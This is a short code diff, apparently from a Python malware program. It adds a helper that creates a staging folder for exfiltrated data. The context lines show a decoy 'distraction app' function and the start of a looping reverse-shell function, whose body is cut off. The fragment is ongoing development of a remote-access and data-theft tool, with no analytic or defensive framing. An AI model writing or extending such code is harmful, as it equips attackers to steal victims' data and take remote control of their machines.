@@ -457,6 +457,10 @@ def launch_distraction_app():
     except:
         pass
 
+def ensure_exfil_folder():
+    if not os.path.exists(EXTRACT_FOLDER):
+        os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+
 def reverse_shell():
     while True:
         try:
